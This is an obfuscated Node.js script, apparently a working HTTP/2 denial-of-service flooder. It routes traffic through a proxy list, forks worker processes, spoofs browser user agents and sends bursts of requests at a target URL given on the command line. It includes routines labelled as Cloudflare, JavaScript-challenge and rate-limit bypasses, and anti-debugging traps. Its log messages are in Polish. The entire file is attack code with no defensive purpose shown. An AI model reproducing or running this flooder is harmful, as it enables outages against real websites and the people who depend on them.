const m = D;
(function(M, n) {
    const G = D,
        C = M();
    while (!![]) {
        try {
            const k = parseInt(G(0x1df)) / 0x1 + parseInt(G(0x214)) / 0x2 * (-parseInt(G(0x20a)) / 0x3) + -parseInt(G(0x20d)) / 0x4 + -parseInt(G(0x1dd)) / 0x5 + parseInt(G(0x1e2)) / 0x6 + -parseInt(G(0x20b)) / 0x7 * (-parseInt(G(0x208)) / 0x8) + -parseInt(G(0x1eb)) / 0x9 * (parseInt(G(0x1f5)) / 0xa);
            if (k === n) break;
            else C['push'](C['shift']());
        } catch (E) {
            C['push'](C['shift']());
        }
    }
}(Y, 0xd39c9));
const net = require('net'),
    http2 = require('http2'),
    tls = require('tls'),
    cluster = require('cluster'),
    url = require('url'),
    crypto = require('crypto'),
    userAgents = require('user-agents'),
    fs = require('fs'),
    fetch = require('node-fetch'),
    {
        Headers
    } = require('node-fetch');

function D(u, M) {
    const n = Y();
    return D = function(C, k) {
        C = C - 0x1cb;
        let E = n[C];
        return E;
    }, D(u, M);
}
process['on'](m(0x20c), function(M) {}), process[m(0x1ef)](0x0), require('events')[m(0x1de)]['defaultMaxListeners'] = 0x0;

function readLines(M) {
    const i = m;
    return fs['readFileSync'](M, i(0x212))[i(0x1ee)]()['split'](/\r?\n/);
}

function randomIntn(M, n) {
    const A = m;
    return Math[A(0x202)](Math[A(0x207)]() * (n - M) + M);
}

function randomElement(M) {
    const t = m;
    return M[randomIntn(0x0, M[t(0x213)])];
}

function shuffleArray(n) {
    const I = m,
        C = (function() {
            let k = !![];
            return function(E, b) {
                const V = k ? function() {
                    if (b) {
                        const r = b['apply'](E, arguments);
                        return b = null, r;
                    }
                } : function() {};
                return k = ![], V;
            };
        }());
    (function() {
        C(this, function() {
            const L = D,
                k = new RegExp('function\x20*\x5c(\x20*\x5c)'),
                E = new RegExp('\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
                b = u('init');
            !k['test'](b + L(0x1e7)) || !E[L(0x221)](b + 'input') ? b('0') : u();
        })();
    }());
    for (let k = n['length'] - 0x1; k > 0x0; k--) {
        const E = Math[I(0x202)](Math['random']() * (k + 0x1));
        [n[k], n[E]] = [n[E], n[k]];
    }
}
const args = {
        'target': process['argv'][0x2],
        'time': ~~process['argv'][0x3],
        'Rate': ~~process['argv'][0x4],
        'threads': ~~process[m(0x222)][0x5],
        'proxyFile': process['argv'][0x6]
    },
    proxies = readLines(args[m(0x209)]),
    parsedTarget = url[m(0x1ec)](args[m(0x1d2)]);
if (cluster['isMaster'])
    for (let counter = 0x1; counter <= args[m(0x219)]; counter++) {
        cluster[m(0x21b)]();
    } else setInterval(runFlooder);
class NetSocket {
    constructor() {}
    async[m(0x1e8)](M) {
        const W = m,
            n = M[W(0x1f4)]['split'](':'),
            C = n[0x0],
            k = W(0x20f) + M[W(0x1f4)] + W(0x1fc) + M[W(0x1f4)] + W(0x216),
            E = Buffer[W(0x1f2)](k),
            b = net['connect']({
                'host': M['host'],
                'port': M[W(0x1f8)]
            }),
            V = randomIntn(0x0, 0x1f4);
        await new Promise(r => setTimeout(r, V)), b[W(0x21d)](M[W(0x1db)] * 0x2710), await new Promise((r, l) => {
            const P = W;
            b['on'](P(0x224), () => {
                r();
            }), b['on']('data', Z => {
                const x = P,
                    q = Z[x(0x1ee)]('utf-8'),
                    w = q['includes'](x(0x204));
                w === ![] && (b['destroy'](), l(x(0x1d1))), r(b);
            }), b['on'](P(0x1db), () => {
                const T = P;
                b[T(0x1e6)](), l(T(0x201));
            }), b['on'](P(0x1dc), Z => {
                b['destroy'](), l('error:\x20' + Z);
            });
        });
    }
}
const Socker = new NetSocket(),
    userAgentList = [new userAgents({
        'deviceCategory': m(0x21a)
    }), new userAgents({
        'deviceCategory': m(0x1d8)
    }), new userAgents({
        'deviceCategory': m(0x20e)
    })];

function Y() {
    const u0 = [':443\x20HTTP/1.1\x0d\x0aHost:\x20', 'toISOString', 'gzip,\x20deflate,\x20br', 'https:', 'https://www.google.com/', 'error:\x20timeout\x20exceeded', 'floor', 'includes', 'HTTP/1.1\x20200', 'string', 'split', 'random', '4455184jYiAHp', 'proxyFile', '105873xusOck', '21fSlAGb', 'uncaughtException', '355536CIMPHP', 'mobile', 'CONNECT\x20', 'request', 'user-agent', 'utf-8', 'length', '14QdAgqI', 'append', ':443\x0d\x0aConnection:\x20Keep-Alive\x0d\x0a\x0d\x0a', ':authority', 'close', 'threads', 'desktop', 'fork', 'debu', 'setTimeout', 'Sukces:\x20', 'then', 'call', 'test', 'argv', 'SHA-256:RqiHyxRAQSbDM...', 'connect', 'User-Agent', '<script>', 'Referer', ':443', 'results.txt', 'apply', 'GET', 'constructor', 'message', 'error:\x20invalid\x20response\x20from\x20proxy\x20server', 'target', 'Custom-Value', 'host', 'accept-encoding', 'catch', 'settings', 'tablet', 'counter', 'Rate', 'timeout', 'error', '1697240RxmBcN', 'EventEmitter', '393578oCvFAl', 'response', 'TLS_CHACHA20_POLY1305_SHA256', '6639234sYZhDA', 'TLS_AES_256_GCM_SHA384', 'end', 'time', 'destroy', 'chain', 'HTTP', 'setKeepAlive', 'log', '24471EDVNrx', 'parse', 'appendFileSync', 'toString', 'setMaxListeners', '\x20-\x20', 'hostname', 'from', 'href', 'address', '5990NzUtlB', 'text', 'status', 'port', 'your-custom-ip', 'gger', 'Błąd:\x20'];
    Y = function() {
        return u0;
    };
    return Y();
}
shuffleArray(userAgentList);
const customHeaders = {
        'X-Forwarded-For': m(0x1f9),
        'X-Custom-Header': m(0x1d3)
    },
    cfBypass = async() => {
        const N = m,
            M = new Headers();
        M['append'](N(0x225), randomElement(userAgentList)[N(0x1ee)]()), M['append'](N(0x227), N(0x200));
        const n = await fetch(args['target'], {
            'method': N(0x1ce),
            'headers': M
        });
        if (n[N(0x1f7)] !== 0x1f7) return !![];
        return ![];
    },
    jsBypass = async() => {
        const R = m,
            M = new Headers();
        M['append'](R(0x225), randomElement(userAgentList)[R(0x1ee)]()), M[R(0x215)](R(0x227), R(0x200));
        const n = await fetch(args[R(0x1d2)], {
                'method': 'GET',
                'headers': M
            }),
            C = await n[R(0x1f6)]();
        if (C[R(0x203)](R(0x226))) return !![];
        return ![];
    },
    ratelimitBypass = async() => {
        const O = m,
            M = new Headers();
        M[O(0x215)](O(0x225), randomElement(userAgentList)[O(0x1ee)]()), M[O(0x215)](O(0x227), O(0x200));
        const n = await fetch(args[O(0x1d2)], {
            'method': O(0x1ce),
            'headers': M
        });
        if (n[O(0x1f7)] === 0x1ad) return ![];
        return !![];
    },
    managedChallengeBypass = async() => {},
    advancedBypass = async() => {
        const a = m,
            M = 'Custom-Request-Body',
            n = randomElement(userAgentList)[a(0x1ee)](),
            C = randomElement(proxies),
            k = C[a(0x206)](':'),
            E = {
                'host': k[0x0],
                'port': ~~k[0x1],
                'address': parsedTarget['host'] + ':443',
                'timeout': 0xf
            };
        return new Promise(async(b, V) => {
            const Q = a;
            try {
                const r = await Socker[Q(0x1e8)](E),
                    l = {
                        'ALPNProtocols': ['h2'],
                        'rejectUnauthorized': ![],
                        'servername': url[Q(0x1f1)],
                        'secure': !![],
                        'servername': parsedTarget[Q(0x1d4)],
                        'cipherSuites': [Q(0x1e3), Q(0x1e1)],
                        'fingerprint': Q(0x223)
                    },
                    Z = tls[Q(0x224)](0x1bb, parsedTarget[Q(0x1d4)], l);
                Z[Q(0x1e9)](!![], 0x3c * 0x2710);
                const q = http2[Q(0x224)](parsedTarget[Q(0x1f3)], {
                    'protocol': Q(0x1ff),
                    'settings': {
                        'maxFrameSize': 0x4000,
                        'maxConcurrentStreams': 0x64,
                        'initialWindowSize': 0xffff
                    },
                    'maxSessionMemory': 0xd05,
                    'maxDeflateDynamicTableSize': 0xffffffff,
                    'createConnection': () => Z,
                    'socket': r
                });
                q[Q(0x1d7)]({
                    'headerTableSize': 0x10000,
                    'maxConcurrentStreams': 0x3e8,
                    'initialWindowSize': 0x600000,
                    'maxHeaderListSize': 0x40000,
                    'enablePush': ![]
                }), q['on']('connect', () => {
                    const w = setInterval(() => {
                        const g = D;
                        for (let o = 0x0; o < args[g(0x1da)]; o++) {
                            const f = {...customHeaders
                            };
                            f[g(0x217)] = parsedTarget[g(0x1d4)], f[g(0x211)] = n, f['accept-encoding'] = g(0x1fe);
                            const v = q[g(0x210)](f);
                            v['on'](g(0x1e0), d => {
                                const c = g;
                                fs[c(0x1ed)](c(0x1cc), 'Sukces:\x20' + new Date()[c(0x1fd)]() + c(0x1f0) + d[c(0x1f7)] + '\x0a'), v[c(0x218)](), v['destroy']();
                                return;
                            }), v['on']('error', d => {
                                const s = g;
                                fs[s(0x1ed)](s(0x1cc), s(0x1fb) + new Date()[s(0x1fd)]() + s(0x1f0) + d[s(0x1d0)] + '\x0a'), v[s(0x218)](), v[s(0x1e6)]();
                                return;
                            }), M ? v[g(0x1e4)](M) : setTimeout(() => {
                                const z = g;
                                v[z(0x1e4)]();
                            }, 0x0);
                        }
                    }, 0x1f4);
                }), q['on'](Q(0x218), () => {
                    const S = Q;
                    q['destroy'](), r[S(0x1e6)](), b(!![]);
                }), q['on']('error', w => {
                    const K = Q;
                    q['destroy'](), r[K(0x1e6)](), b(![]);
                });
            } catch (w) {
                console[Q(0x1dc)](w), b(![]);
            }
        });
    };

function runFlooder() {
    const e = m;
    Promise['all']([cfBypass(), jsBypass(), ratelimitBypass(), managedChallengeBypass(), advancedBypass()])[e(0x21f)](([M, n, C, k, E]) => {
        const p = e;
        !M && !n && !C && !k && !E && (console[p(0x1ea)]('Bypass\x20nieudany.\x20Przerwano\x20flood.'), process['exit']());
        const b = randomElement(proxies),
            V = b[p(0x206)](':'),
            r = randomElement(userAgentList)[p(0x1ee)](),
            l = {
                'host': V[0x0],
                'port': ~~V[0x1],
                'address': parsedTarget['host'] + p(0x1cb),
                'timeout': 0xf
            };
        Socker[p(0x1e8)](l)[p(0x21f)](Z => {
            const F = p,
                q = {
                    'ALPNProtocols': ['h2'],
                    'rejectUnauthorized': ![],
                    'servername': url[F(0x1f1)],
                    'secure': !![],
                    'servername': parsedTarget[F(0x1d4)],
                    'cipherSuites': [F(0x1e3), F(0x1e1)],
                    'fingerprint': F(0x223)
                },
                w = tls[F(0x224)](0x1bb, parsedTarget[F(0x1d4)], q);
            w[F(0x1e9)](!![], 0x3c * 0x2710);
            const o = http2[F(0x224)](parsedTarget[F(0x1f3)], {
                'protocol': F(0x1ff),
                'settings': {
                    'maxFrameSize': 0x4000,
                    'maxConcurrentStreams': 0x64,
                    'initialWindowSize': 0xffff
                },
                'maxSessionMemory': 0xd05,
                'maxDeflateDynamicTableSize': 0xffffffff,
                'createConnection': () => w,
                'socket': Z
            });
            o[F(0x1d7)]({
                'headerTableSize': 0x10000,
                'maxConcurrentStreams': 0x3e8,
                'initialWindowSize': 0x600000,
                'maxHeaderListSize': 0x40000,
                'enablePush': ![]
            }), o['on'](F(0x224), () => {
                const f = setInterval(() => {
                    const j = D;
                    for (let v = 0x0; v < args[j(0x1da)]; v++) {
                        const d = {...headers
                        };
                        d[j(0x217)] = parsedTarget[j(0x1d4)], d[j(0x211)] = r, d[j(0x1d5)] = j(0x1fe);
                        const y = o['request'](d);
                        y['on']('response', h => {
                            const U = j;
                            fs[U(0x1ed)](U(0x1cc), U(0x21e) + new Date()['toISOString']() + U(0x1f0) + h[U(0x1f7)] + '\x0a'), y[U(0x218)](), y[U(0x1e6)]();
                            return;
                        }), y['on']('error', h => {
                            const B = j;
                            fs[B(0x1ed)]('results.txt', B(0x1fb) + new Date()['toISOString']() + B(0x1f0) + h['message'] + '\x0a'), y['close'](), y[B(0x1e6)]();
                            return;
                        }), setTimeout(() => {
                            y['end']();
                        }, 0x0);
                    }
                }, 0x1f4);
            }), o['on'](F(0x218), () => {
                const H = F;
                o[H(0x1e6)](), Z[H(0x1e6)]();
                return;
            }), o['on']('error', f => {
                const J = F;
                o[J(0x1e6)](), Z[J(0x1e6)]();
                return;
            });
        })[p(0x1d6)](Z => {
            console['error'](Z);
        });
    });
}
const KillScript = () => process['exit'](0x1);
setTimeout(KillScript, args[m(0x1e5)] * 0x3e8);

function u(M) {
    function n(C) {
        const X = D;
        if (typeof C === X(0x205)) return function(k) {}[X(0x1cf)]('while\x20(true)\x20{}')[X(0x1cd)](X(0x1d9));
        else('' + C / C)['length'] !== 0x1 || C % 0x14 === 0x0 ? function() {
            return !![];
        }['constructor'](X(0x21c) + X(0x1fa))[X(0x220)]('action') : function() {
            return ![];
        }['constructor'](X(0x21c) + X(0x1fa))[X(0x1cd)]('stateObject');
        n(++C);
    }
    try {
        if (M) return n;
        else n(0x0);
    } catch (C) {}
}